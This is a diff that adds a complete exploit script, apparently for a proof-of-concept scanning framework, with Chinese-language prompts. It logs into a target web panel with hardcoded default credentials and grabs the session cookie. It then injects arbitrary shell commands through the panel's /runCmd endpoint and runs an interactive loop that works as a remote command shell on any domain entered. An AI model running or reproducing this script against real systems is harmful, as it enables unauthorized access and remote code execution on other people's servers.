@@ -1,0 +1,35 @@
+#define find = err":0
+function login(domain){
+	res = HttpPost(domain."/auth","username=useradmin&password=supermanito","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
+	if(StrFindStr(res[0],find,0) !="-1"){
+		Cookie = GettextMiddle(res[1],"Set-Cookie:[","; Path=/");
+		return Cookie;
+	}
+	return "";
+}
+function exp(domain,Cookie,cmd){
+	res = HttpPost(domain."/runCmd","cmd=bash+jd.sh+%3Becho ws%3B".cmd."%3Becho wker%3B&delay=500","Cookie: ".Cookie.StrRN()."User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
+	if(StrFindStr(res[0],"wker",0) != "-1"){
+		return GettextMiddle(res[0],"ws","wker");
+	}else{
+		return "";
+	}
+}
+function main(args){
+	print("请输入域名:");domain = input();
+	try{
+		Cookie = login(domain);
+		if(Cookie != ""){
+			print("请输入执行的命令[exit退出]:");cmd = input();
+			while(cmd != "exit"){
+				r = exp(domain,Cookie,cmd);
+				if(r != ""){
+					printclolor(r,3);
+				}
+				print("请输入执行的命令[exit退出]:");cmd = input();
+			}
+		}
+	}catch{
+	}
+	print("已退出！");
+}
